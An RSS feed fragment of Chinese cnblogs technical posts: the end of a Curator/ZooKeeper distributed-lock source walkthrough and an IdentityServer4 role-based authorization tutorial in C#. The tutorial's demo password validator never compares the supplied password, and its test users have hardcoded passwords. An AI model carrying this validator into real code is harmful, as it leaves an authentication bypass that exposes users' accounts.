                &lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt; ( predicateResults.getsTheLock() )
                {
                    haveTheLock &lt;/span&gt;= &lt;span&gt;true&lt;/span&gt;&lt;span&gt;;
                }
                &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;
                {
                    String  previousSequencePath &lt;/span&gt;= basePath + &quot;/&quot; +&lt;span&gt; predicateResults.getPathToWatch();

                    &lt;/span&gt;&lt;span&gt;synchronized&lt;/span&gt;(&lt;span&gt;this&lt;/span&gt;&lt;span&gt;)
                    {
                        Stat stat &lt;/span&gt;=&lt;span&gt; client.checkExists().usingWatcher(watcher).forPath(previousSequencePath);
                        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; ( stat != &lt;span&gt;null&lt;/span&gt;&lt;span&gt; )
                        {
                            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; ( millisToWait != &lt;span&gt;null&lt;/span&gt;&lt;span&gt; )
                            {
                                millisToWait &lt;/span&gt;-= (System.currentTimeMillis() -&lt;span&gt; startMillis);
                                startMillis &lt;/span&gt;=&lt;span&gt; System.currentTimeMillis();
                                &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; ( millisToWait &amp;lt;= 0&lt;span&gt; )
                                {
                                    doDelete &lt;/span&gt;= &lt;span&gt;true&lt;/span&gt;;    &lt;span&gt;//&lt;/span&gt;&lt;span&gt; timed out - delete our node&lt;/span&gt;
                                    &lt;span&gt;break&lt;/span&gt;&lt;span&gt;;
                                }

                                wait(millisToWait);
                            }
                            &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;
                            {
                                wait();
                            }
                        }
                    }
                    &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; else it may have been deleted (i.e. lock released). Try to acquire again&lt;/span&gt;
&lt;span&gt;                }
            }
        }

           &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; 省略部分代码&lt;/span&gt;
        &lt;span&gt;return&lt;/span&gt;&lt;span&gt; haveTheLock;
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;strong&gt;重点看while循环中的逻辑&lt;/strong&gt;&lt;br/&gt;首先是获取锁的逻辑：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;获取&lt;code&gt;/locks/lock_01&lt;/code&gt;下排好序的znode节点，上面看图已经知道，会有&lt;code&gt;xxx01&lt;/code&gt; 和 &lt;code&gt;xxx02&lt;/code&gt;两个节点&lt;/li&gt;
&lt;li&gt;调用&lt;code&gt;getsTheLock()&lt;/code&gt;方法获取锁，其中&lt;code&gt;maxLeases&lt;/code&gt;为1，默认只能一个线程获取锁&lt;/li&gt;
&lt;li&gt;定位到&lt;code&gt;StandardLockInternalsDriver.getsTheLock()&lt;/code&gt;方法，其中代码核心如下：&lt;br/&gt;&lt;code&gt;int ourIndex = children.indexOf(sequenceNodeName);&lt;/code&gt;&lt;br/&gt;&lt;code&gt;boolean getsTheLock = ourIndex &amp;amp;lt; maxLeases;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;上面&lt;code&gt;sequenceNodeName&lt;/code&gt;参数为&lt;code&gt;xxx01&lt;/code&gt;的全路径名，然后查看在排好序的children列表中是否为第一个元素，如果是第一个元素，返回的ourIndex=0，此时则认为获取锁成功&lt;/li&gt;
&lt;li&gt;如果为有序列表中的第一个元素，那么&lt;code&gt;predicateResults.getsTheLock()&lt;/code&gt; 为true，获取锁的标志位&lt;code&gt;havaTheLock&lt;/code&gt;为true，直接返回获取锁成功&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;然后是获取锁失败的逻辑：&lt;br/&gt;获取锁失败的核心代码：&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
String  previousSequencePath = basePath + &quot;/&quot; +&lt;span&gt; predicateResults.getPathToWatch();

&lt;/span&gt;&lt;span&gt;synchronized&lt;/span&gt;(&lt;span&gt;this&lt;/span&gt;&lt;span&gt;)
{
    Stat stat &lt;/span&gt;=&lt;span&gt; client.checkExists().usingWatcher(watcher).forPath(previousSequencePath);
    &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; ( stat != &lt;span&gt;null&lt;/span&gt;&lt;span&gt; )
    {
        &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; ( millisToWait != &lt;span&gt;null&lt;/span&gt;&lt;span&gt; )
        {
            millisToWait &lt;/span&gt;-= (System.currentTimeMillis() -&lt;span&gt; startMillis);
            startMillis &lt;/span&gt;=&lt;span&gt; System.currentTimeMillis();
            &lt;/span&gt;&lt;span&gt;if&lt;/span&gt; ( millisToWait &amp;lt;= 0&lt;span&gt; )
            {
                doDelete &lt;/span&gt;= &lt;span&gt;true&lt;/span&gt;;    &lt;span&gt;//&lt;/span&gt;&lt;span&gt; timed out - delete our node&lt;/span&gt;
                &lt;span&gt;break&lt;/span&gt;&lt;span&gt;;
            }

            wait(millisToWait);
        }
        &lt;/span&gt;&lt;span&gt;else&lt;/span&gt;&lt;span&gt;
        {
            wait();
        }
    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;ol&gt;&lt;li&gt;针对上一个节点添加监听器&lt;/li&gt;
&lt;li&gt;如果加锁有过期时间，到了过期时间后直接break退出循环&lt;/li&gt;
&lt;li&gt;当前线程处于wait()状态，等待上一个线程释放锁&lt;/li&gt;
&lt;/ol&gt;&lt;h3 id=&quot;hcurator-3&quot;&gt;Curator 释放锁实现原理&lt;/h3&gt;
&lt;p&gt;释放锁其实很简单，直接删除当前临时节点，因为下一个节点监听了上一个节点信息，所以上一个节点删除后，当前节点就会被唤醒重新获取锁。&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;private&lt;/span&gt; &lt;span&gt;void&lt;/span&gt; deleteOurPath(String ourPath) &lt;span&gt;throws&lt;/span&gt;&lt;span&gt; Exception
{
    &lt;/span&gt;&lt;span&gt;try&lt;/span&gt;&lt;span&gt;
    {
        client.delete().guaranteed().forPath(ourPath);
    }
    &lt;/span&gt;&lt;span&gt;catch&lt;/span&gt;&lt;span&gt; ( KeeperException.NoNodeException e )
    {
        &lt;/span&gt;&lt;span&gt;//&lt;/span&gt;&lt;span&gt; ignore - already deleted (possibly expired session, etc.)&lt;/span&gt;
&lt;span&gt;    }
}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h3 id=&quot;h-4&quot;&gt;总结&lt;/h3&gt;
&lt;p&gt;一张图总结：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/799093/202003/799093-20200330074047472-478649610.jpg&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;04_Zookeeper分布式锁实现原理.jpg&lt;/p&gt;
&lt;p&gt;原图可查看我的分享：&lt;br/&gt;https://www.processon.com/view/link/5e80508de4b06b85300175d2&lt;/p&gt;
</description>
<pubDate>Sun, 29 Mar 2020 23:27:00 +0000</pubDate>
<dc:creator>一枝花算不算浪漫</dc:creator>
<og:description>前言 前面已经讲解了Redis的客户端Redission是怎么实现分布式锁的，大多都深入到源码级别。 在分布式系统中，常见的分布式锁实现方案还有Zookeeper，接下来会深入研究Zookeeper是</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/wang-meng/p/12593992.html</dc:identifier>
</item>
<item>
<title>Asp.Net Core 中IdentityServer4 实战之角色授权详解 - Jlion</title>
<link>http://www.cnblogs.com/jlion/p/12571620.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/jlion/p/12571620.html</guid>
<description>&lt;p&gt;假如有这么一个数据网关服务服务，客户端有三种账号角色（普通用户、管理员用户、超级管理员用户），数据网关针对这三种角色用户分配不同的数据访问权限，那怎么样通过IdentityServer4 来实现角色的授权呢？它又是怎样的一个过程？&lt;/p&gt;&lt;div id=&quot;cnblogs_post_body&quot; readability=&quot;240.25241146237&quot;&gt;
&lt;h2 id=&quot;一、前言&quot;&gt;一、前言&lt;/h2&gt;
&lt;p&gt;前几篇文章分享了&lt;code&gt;IdentityServer4&lt;/code&gt;密码模式的基本授权及自定义授权等方式，最近由于改造一个网关服务，用到了&lt;code&gt;IdentityServer4&lt;/code&gt;的授权，改造过程中发现比较适合基于&lt;code&gt;Role&lt;/code&gt;角色的授权，通过不同的角色来限制用户访问不同的&lt;code&gt;Api资源&lt;/code&gt;，这里我就来分享&lt;code&gt;IdentityServer4&lt;/code&gt;基于角色的授权详解。&lt;/p&gt;
&lt;h4 id=&quot;identityserver4-历史文章目录&quot;&gt;IdentityServer4 历史文章目录&lt;/h4&gt;
&lt;p&gt;没有看过之前的几篇文章，我建议先回过头看看上面那几篇文章再来看本篇文章，不过对于大牛来说就可以跳过了。。。。&lt;/p&gt;
&lt;h2 id=&quot;二、模拟场景&quot;&gt;二、模拟场景&lt;/h2&gt;
&lt;p&gt;还是按照我的文章风格套路，实战之前先来模拟下应用场景，无场景的实战都是耍流氓，模拟场景更能让大家投入，同时也是自我学习、思考、总结的结晶之处！！！&lt;/p&gt;
&lt;p&gt;对于角色授权大家也不陌生，大家比较熟悉的应该是&lt;code&gt;RBAC&lt;/code&gt;的设计，这里就不阐述&lt;code&gt;RBAC&lt;/code&gt;，有兴趣的可以百度。我们这里简单模拟下角色场景&lt;br/&gt;假如有这么一个&lt;code&gt;数据网关服务&lt;/code&gt;服务（下面我统称为&lt;code&gt;数据网关&lt;/code&gt;），客户端有三种账号角色（普通用户、管理员用户、超级管理员用户），数据网关针对这三种角色用户分配不同的数据访问权限，场景图如下：&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/824291/202003/824291-20200328175216974-1045194802.jpg&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;那么这种场景我们会怎么去设计呢？这个场景还算比较简单，角色比较单一，比较固定，对于这种场景很多人可能会考虑到通过&lt;code&gt;Filter&lt;/code&gt;过滤器等方式来实现，这当然可以。不过正对这种场景&lt;code&gt;IdentityServer4&lt;/code&gt;中本身就支持角色授权，下面我来给大家分享&lt;code&gt;IdentityServer4&lt;/code&gt;的角色授权.&lt;/p&gt;
&lt;h2 id=&quot;三、角色授权实战&quot;&gt;三、角色授权实战&lt;/h2&gt;
&lt;h4 id=&quot;授权流程&quot;&gt;授权流程&lt;/h4&gt;
&lt;p&gt;撸代码之前我们先整理下&lt;code&gt;IdentityServer4&lt;/code&gt;的 角色授权流程图，我简单概括画了下，流程图如下：&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/824291/202003/824291-20200328175347833-226144972.jpg&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;场景图概括如下：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;客户端分为三种核心角色（普通用户、管理员用户、超级管理-老板）用户，三种用户访问同一个&lt;code&gt;数据网关&lt;/code&gt;（API资源）&lt;/li&gt;
&lt;li&gt;&lt;code&gt;数据网关&lt;/code&gt;（API资源）对这三种用户角色做了访问限制。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;角色授权流程解释如下：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;第一步： 不同的用户携带用户密码等信息访问&lt;code&gt;授权中心&lt;/code&gt;（ids4）尝试授权&lt;/li&gt;
&lt;li&gt;第二步： &lt;code&gt;授权中心&lt;/code&gt;对用户授权通过返回&lt;code&gt;access_token&lt;/code&gt;给用户同时声明用户的&lt;code&gt;Role&lt;/code&gt;到&lt;code&gt;Claim&lt;/code&gt;中。。&lt;/li&gt;
&lt;li&gt;第三步： 客户端携带拿到的&lt;code&gt;access_token&lt;/code&gt;尝试请求&lt;code&gt;数据网关&lt;/code&gt;（API资源）。&lt;/li&gt;
&lt;li&gt;第四步：&lt;code&gt;数据网关&lt;/code&gt;收到客户端的第一次请求会到&lt;code&gt;授权中心&lt;/code&gt;请求获得验证公钥。&lt;/li&gt;
&lt;li&gt;第五步：&lt;code&gt;授权中心&lt;/code&gt;返回&lt;code&gt;验证公钥&lt;/code&gt;给&lt;code&gt;数据网关&lt;/code&gt;并且缓存起来，后面不再到&lt;code&gt;授权中心&lt;/code&gt;再次获得验证公钥（只会请求一次，除非重启服务）。&lt;/li&gt;
&lt;li&gt;第六步：&lt;code&gt;数据网关&lt;/code&gt;（ids4）通过验证网关验证&lt;code&gt;access_token&lt;/code&gt;是否验证通过，并且验证请求的客户端用户声明的&lt;code&gt;Role&lt;/code&gt;是否和请求的&lt;code&gt;API资源&lt;/code&gt;约定的的角色一致。如果一致则通过第步返回给用户端，否则直接拒绝请求.&lt;/li&gt;
&lt;/ul&gt;&lt;h4 id=&quot;撸代码&quot;&gt;撸代码&lt;/h4&gt;
&lt;p&gt;代码继续上面几篇文章的例子的续集，你懂的，就不从零开始撸代码啦（强烈建议没看过上面几篇的先看下上面的目录中的几篇，要不然会一头雾水，大佬跳过）&lt;br/&gt;要使&lt;code&gt;IdentityServer4&lt;/code&gt;实现的&lt;code&gt;授权中心&lt;/code&gt;支持角色验证的支持，我们需要在定义的&lt;code&gt;API资源&lt;/code&gt;中添加&lt;code&gt;角色&lt;/code&gt;的引入，代码如下：&lt;br/&gt;上几篇文章的&lt;code&gt;授权中心&lt;/code&gt;（Jlion.NetCore.Identity.Service）的&lt;br/&gt;代码如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt; /// &amp;lt;summary&amp;gt;
 /// 资源
 /// &amp;lt;/summary&amp;gt;
 /// &amp;lt;returns&amp;gt;&amp;lt;/returns&amp;gt;
 public static IEnumerable&amp;lt;ApiResource&amp;gt; GetApiResources()
 {
     return new List&amp;lt;ApiResource&amp;gt;
     {
         new ApiResource(OAuthConfig.UserApi.ApiName,OAuthConfig.UserApi.ApiName),
     };
 }
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;加入角色的支持代码改造如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt; /// &amp;lt;summary&amp;gt;
 /// 资源
 /// &amp;lt;/summary&amp;gt;
 /// &amp;lt;returns&amp;gt;&amp;lt;/returns&amp;gt;
 public static IEnumerable&amp;lt;ApiResource&amp;gt; GetApiResources()
 {
      return new List&amp;lt;ApiResource&amp;gt;
      {
          new ApiResource(
              OAuthConfig.UserApi.ApiName,
              OAuthConfig.UserApi.ApiName,
              new List&amp;lt;string&amp;gt;(){JwtClaimTypes.Role }
              ),
      };
 }
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;API资源&lt;/code&gt;中添加了&lt;code&gt;角色&lt;/code&gt;验证的支持后，需要在用户登录授权成功后声明Claim用户的&lt;code&gt;Role&lt;/code&gt;信息，代码如下：&lt;br/&gt;改造前代码：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;public class ResourceOwnerPasswordValidator : IResourceOwnerPasswordValidator
{
   public async Task ValidateAsync(ResourceOwnerPasswordValidationContext context)
   {
       try
       {
           var userName = context.UserName;
           var password = context.Password;

           //验证用户,这么可以到数据库里面验证用户名和密码是否正确
           var claimList = await ValidateUserAsync(userName, password);

           // 验证账号
           context.Result = new GrantValidationResult
           (
              subject: userName,
              authenticationMethod: &quot;custom&quot;,
              claims: claimList.ToArray()
           );
       }
       catch (Exception ex)
       {
           //验证异常结果
           context.Result = new GrantValidationResult()
           {
              IsError = true,
              Error = ex.Message
           };
       }
   }

   #region Private Method
   /// &amp;lt;summary&amp;gt;
   /// 验证用户
   /// &amp;lt;/summary&amp;gt;
   /// &amp;lt;param name=&quot;loginName&quot;&amp;gt;&amp;lt;/param&amp;gt;
   /// &amp;lt;param name=&quot;password&quot;&amp;gt;&amp;lt;/param&amp;gt;
   /// &amp;lt;returns&amp;gt;&amp;lt;/returns&amp;gt;
   private async Task&amp;lt;List&amp;lt;Claim&amp;gt;&amp;gt; ValidateUserAsync(string loginName, string password)
   {
      //TODO 这里可以通过用户名和密码到数据库中去验证是否存在，
      // 以及角色相关信息，我这里还是使用内存中已经存在的用户和密码
      var user = OAuthMemoryData.GetTestUsers();

      if (user == null)
          throw new Exception(&quot;登录失败，用户名和密码不正确&quot;);

      return new List&amp;lt;Claim&amp;gt;()
      {
                
          new Claim(ClaimTypes.Name, $&quot;{loginName}&quot;),
          new Claim(EnumUserClaim.DisplayName.ToString(),&quot;测试用户&quot;),
          new Claim(EnumUserClaim.UserId.ToString(),&quot;10001&quot;),
          new Claim(EnumUserClaim.MerchantId.ToString(),&quot;000100001&quot;),
      };
   }
   #endregion
 }
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;为了保留之前文章的源代码，好让之前的文章源代码可追溯，我这里不在源代码上改造升级，我直接新增一个用户密码验证器类,&lt;br/&gt;命名为&lt;code&gt;RoleTestResourceOwnerPasswordValidator&lt;/code&gt;,代码改造如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt; /// &amp;lt;summary&amp;gt;
 /// 角色授权用户名密码验证器demo
 /// &amp;lt;/summary&amp;gt;
 public class RoleTestResourceOwnerPasswordValidator : IResourceOwnerPasswordValidator
 {
     public async Task ValidateAsync(ResourceOwnerPasswordValidationContext context)
     {
         try
         {
             var userName = context.UserName;
             var password = context.Password;

             //验证用户,这么可以到数据库里面验证用户名和密码是否正确
             var claimList = await ValidateUserByRoleAsync(userName, password);

             // 验证账号
             context.Result = new GrantValidationResult
             (
                 subject: userName,
                 authenticationMethod: &quot;custom&quot;,
                 claims: claimList.ToArray()
             );
         }
         catch (Exception ex)
         {
             //验证异常结果
             context.Result = new GrantValidationResult()
             {
                 IsError = true,
                 Error = ex.Message
             };
         }
     }

     #region Private Method

     /// &amp;lt;summary&amp;gt;
     /// 验证用户(角色Demo 专用方法)
     /// 这里和之前区分，主要是为了保留和博客同步源代码
     /// &amp;lt;/summary&amp;gt;
     /// &amp;lt;param name=&quot;loginName&quot;&amp;gt;&amp;lt;/param&amp;gt;
     /// &amp;lt;param name=&quot;password&quot;&amp;gt;&amp;lt;/param&amp;gt;
     /// &amp;lt;returns&amp;gt;&amp;lt;/returns&amp;gt;
     private async Task&amp;lt;List&amp;lt;Claim&amp;gt;&amp;gt; ValidateUserByRoleAsync(string loginName, string password)
     {
         //TODO 这里可以通过用户名和密码到数据库中去验证是否存在，
         // 以及角色相关信息，我这里还是使用内存中已经存在的用户和密码
         var user = OAuthMemoryData.GetUserByUserName(loginName);

         if (user == null)
            throw new Exception(&quot;登录失败，用户名和密码不正确&quot;);

         //下面的Claim 声明我为了演示，硬编码了，
         //实际生产环境需要通过读取数据库的信息并且来声明

         return new List&amp;lt;Claim&amp;gt;()
         {

             new Claim(ClaimTypes.Name, $&quot;{user.UserName}&quot;),
             new Claim(EnumUserClaim.DisplayName.ToString(),user.DisplayName),
             new Claim(EnumUserClaim.UserId.ToString(),user.UserId.ToString()),
             new Claim(EnumUserClaim.MerchantId.ToString(),user.MerchantId.ToString()),
             new Claim(JwtClaimTypes.Role.ToString(),user.Role.ToString())
         };
     }
     #endregion
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;为了方便演示，我直接把&lt;code&gt;Role&lt;/code&gt;定义成了一个公共枚举&lt;code&gt;EnumUserRole&lt;/code&gt;,代码如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;/// &amp;lt;summary&amp;gt;
/// 角色枚举
/// &amp;lt;/summary&amp;gt;
public enum EnumUserRole
{
    Normal,
    Manage,
    SupperManage
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;GetUserByUserName&lt;/code&gt;中硬编码创建了三个角色的用户，代码如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt; /// &amp;lt;summary&amp;gt;
 /// 为了演示，硬编码了，
 /// 这个方法可以通过DDD设计到底层数据库去查询数据库
 /// &amp;lt;/summary&amp;gt;
 /// &amp;lt;param name=&quot;userName&quot;&amp;gt;&amp;lt;/param&amp;gt;
 /// &amp;lt;returns&amp;gt;&amp;lt;/returns&amp;gt;
 public static UserModel GetUserByUserName(string userName)
 {
      var normalUser = new UserModel()
      {
         DisplayName = &quot;张三&quot;,
         MerchantId = 10001,
         Password = &quot;123456&quot;,
         Role = Enums.EnumUserRole.Normal,
         SubjectId = &quot;1&quot;,
         UserId = 20001,
         UserName = &quot;testNormal&quot;
     };
     var manageUser = new UserModel()
     {
         DisplayName = &quot;李四&quot;,
         MerchantId = 10001,
         Password = &quot;123456&quot;,
         Role = Enums.EnumUserRole.Manage,
         SubjectId = &quot;1&quot;,
         UserId = 20001,
         UserName = &quot;testManage&quot;
     };
     var supperManageUser = new UserModel()
     {
         DisplayName = &quot;dotNET博士&quot;,
         MerchantId = 10001,
         Password = &quot;123456&quot;,
         Role = Enums.EnumUserRole.SupperManage,
         SubjectId = &quot;1&quot;,
         UserId = 20001,
         UserName = &quot;testSupperManage&quot;
     };
     var list = new List&amp;lt;UserModel&amp;gt;() {
         normalUser,
         manageUser,
         supperManageUser
     };
     return list?.Where(item =&amp;gt; item.UserName.Equals(userName))?.FirstOrDefault();
 }
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;好了，现在用户授权通过后声明的&lt;code&gt;Role&lt;/code&gt;也已经完成了，我上面使用的是JwtClaimTypes 默认支持的&lt;code&gt;Role&lt;/code&gt;，你也可以不使用&lt;code&gt;JwtClaimTypes&lt;/code&gt;类，可以自定义类来实现。&lt;br/&gt;最后为了让新关注我的博客用户没看过之前几篇文章的用户不至于一头雾水，我把注册&lt;code&gt;ids&lt;/code&gt;中间件代码还是贴出来，&lt;br/&gt;注册新的用户名密码验证器到DI中 代码如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt; public void ConfigureServices(IServiceCollection services)
 {
     services.AddControllers();


     #region 数据库存储方式
     services.AddIdentityServer()
        .AddDeveloperSigningCredential()
        .AddInMemoryApiResources(OAuthMemoryData.GetApiResources())
        //.AddInMemoryClients(OAuthMemoryData.GetClients())
        .AddClientStore&amp;lt;ClientStore&amp;gt;()
        //.AddResourceOwnerValidator&amp;lt;ResourceOwnerPasswordValidator&amp;gt;()
        .AddResourceOwnerValidator&amp;lt;RoleTestResourceOwnerPasswordValidator&amp;gt;()
        .AddExtensionGrantValidator&amp;lt;WeiXinOpenGrantValidator&amp;gt;()
        .AddProfileService&amp;lt;UserProfileService&amp;gt;();//添加微信端自定义方式的验证

     #endregion
 }

 
 public void Configure(IApplicationBuilder app, IWebHostEnvironment env)
 {
    if (env.IsDevelopment())
    {
       app.UseDeveloperExceptionPage();
    }
    //使用IdentityServer4 的中间件
    app.UseIdentityServer();

    app.UseRouting();
    app.UseAuthorization();
    app.UseEndpoints(endpoints =&amp;gt;
    {
         endpoints.MapControllers();
    });
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;授权中心&lt;/code&gt;的角色支持代码撸完了，我们来改造上几篇文章中说到的&lt;code&gt;用户网关&lt;/code&gt;服务，这里我就叫&lt;code&gt;数据网关&lt;/code&gt;，&lt;br/&gt;项目：&lt;code&gt;Jlion.NetCore.Identity.UserApiService&lt;/code&gt;&lt;br/&gt;上一篇关于&lt;a href=&quot;https://www.cnblogs.com/jlion/p/12543486.html&quot;&gt;Asp.Net Core 中IdentityServer4 实战之 Claim详解&lt;/a&gt;&lt;br/&gt;文章中在&lt;code&gt;数据网关&lt;/code&gt;服务中新增了&lt;code&gt;UserController&lt;/code&gt;控制器，并添加了一个访问用户基本的&lt;code&gt;Claim&lt;/code&gt;信息接口，之前的代码如下：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;[ApiController]
[Route(&quot;[controller]&quot;)]
public class UserController : ControllerBase
{

    private readonly ILogger&amp;lt;UserController&amp;gt; _logger;

    public UserController(ILogger&amp;lt;UserController&amp;gt; logger)
    {
        _logger = logger;
    }

    [Authorize]
    [HttpGet]
    public async Task&amp;lt;object&amp;gt; Get()
    {
        var userId = User.UserId();
        return new
        {
            name = User.Name(),
            userId = userId,
            displayName = User.DisplayName(),
            merchantId = User.MerchantId(),
        };
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;上面的代码中&lt;code&gt;Authorize&lt;/code&gt;没有指定&lt;code&gt;Role&lt;/code&gt;，那相当于所有的用户都可以访问这个接口，接下来，我们在&lt;code&gt;UserController&lt;/code&gt;中创建一个只能是&lt;code&gt;超级管理员&lt;/code&gt;角色才能访问的接口，代码如下&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt; [Authorize(Roles =nameof(EnumUserRole.SupperManage))]
 [HttpGet(&quot;{id}&quot;)]
 public async Task&amp;lt;object&amp;gt; Get(int id)
 {
     var userId = User.UserId();
     return new
     {
         name = User.Name(),
         userId = userId,
         displayName = User.DisplayName(),
         merchantId = User.MerchantId(),
         roleName=User.Role()//获得当前登录用户的角色
     };
 }
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;到这里&lt;code&gt;数据网关&lt;/code&gt;代码也已经改造完了，我们接下来就是运行结果看看是否正确。&lt;/p&gt;
&lt;h4 id=&quot;运行&quot;&gt;运行&lt;/h4&gt;
&lt;p&gt;我们分别通过命令行运行我们的&lt;code&gt;授权网关&lt;/code&gt;服务和&lt;code&gt;数据网关&lt;/code&gt;服务，分别如下图:&lt;br/&gt;&lt;code&gt;授权网关&lt;/code&gt;还是指定5000 端口，如下图:&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/824291/202003/824291-20200328121418204-1439174025.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;&lt;code&gt;数据网关&lt;/code&gt;跟之前几篇文章一样指定 5001 端口，如下图：&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/824291/202003/824291-20200328121519324-1379482600.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
&lt;p&gt;现在&lt;code&gt;授权网关&lt;/code&gt;和&lt;code&gt;数据网关&lt;/code&gt;都已经完美运行起来了，接下来我们通过&lt;code&gt;postman&lt;/code&gt;模拟请求。&lt;br/&gt;先来通过普通用户（testNormal）请求&lt;code&gt;授权中心&lt;/code&gt;获得&lt;code&gt;access_token&lt;/code&gt;，如下图:&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/824291/202003/824291-20200328121804409-786368335.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;请求验证通过，&lt;br/&gt;再来通过获取到的&lt;code&gt;access_token&lt;/code&gt; 获取普通接口：&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/824291/202003/824291-20200328121950290-500508800.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;也完美获取到数据&lt;br/&gt;再来访问下标注了&lt;code&gt;supperManage&lt;/code&gt;超级管理员的角色接口，如下图：&lt;br/&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/824291/202003/824291-20200328122111367-1105822413.png&quot; alt=&quot;&quot;/&gt;&lt;br/&gt;结果跟预想的一样，返回了&lt;code&gt;403&lt;/code&gt;访问被拒绝，其他账号运行也是一样，我这里就不一一去运行访问测试了，有兴趣的同学可以到github 上拉起我的源代码进行运行测试，&lt;br/&gt;到这里基于&lt;code&gt;ids4&lt;/code&gt;角色授权基础应用也完成了。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;结束语&lt;/strong&gt;：上面分享学习了&lt;code&gt;IdentityServer4&lt;/code&gt; 进行角色授权的实战例子，但是从上面的例子中有一个不好的弊端，就是每个api访问都需要硬编码进行指定&lt;code&gt;Role&lt;/code&gt; 这在生产环境中很不现实和灵活，&lt;code&gt;Role&lt;/code&gt;角色这个东西都是通过后台自管理，进行灵活配置角色和资源的，那&lt;code&gt;IdentityServer4&lt;/code&gt; 有没有什么好的方式实现呢？留给大家思考，思考就有学习的目标，也是思维的进步。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;博客系列源代码地址&lt;/strong&gt;:&lt;a href=&quot;https://github.com/a312586670/NetCoreDemo&quot;&gt;https://github.com/a312586670/NetCoreDemo&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;感谢语&lt;/strong&gt;：三月份即将过去，三月份同时也是美好的开始，我的博客从三月份开始整理分享，传承着以一起学习，共同进步为目标，自我自律，开始分享相关技术。文章持续性同步至我的微信公众号【dotNET博士】，这个月来初见成效，一个月内已经荣获500+以上的粉丝，也感谢大家一直以来对我的关注，你的关注让我更有动力分享更好的原创技术文章。还没有关注微信公众号的，搜索&quot;dotNET博士&quot;关注，或者微信扫下面的二维码进行关注，同时大家也可以积极的分享或点个右下角的&lt;strong&gt;推荐&lt;/strong&gt;，让更多人的关注到我的文章。&lt;/p&gt;
&lt;/div&gt;</description>
<pubDate>Sun, 29 Mar 2020 23:25:00 +0000</pubDate>
<dc:creator>Jlion</dc:creator>
<og:description>假如有这么一个数据网关服务服务，客户端有三种账号角色（普通用户、管理员用户、超级管理员用户），数据网关针对这三种角色用户分配不同的数据访问权限，那怎么样通过IdentityServer4 来实现角色的</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/jlion/p/12571620.html</dc:identifier>
</item>
<item>
<title> 编程思想：如何设计一个好的通信网络协议 - 木宛城主</title>
<link>http://www.cnblogs.com/OceanEyes/p/protocol_design.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/OceanEyes/p/protocol_design.html</guid>
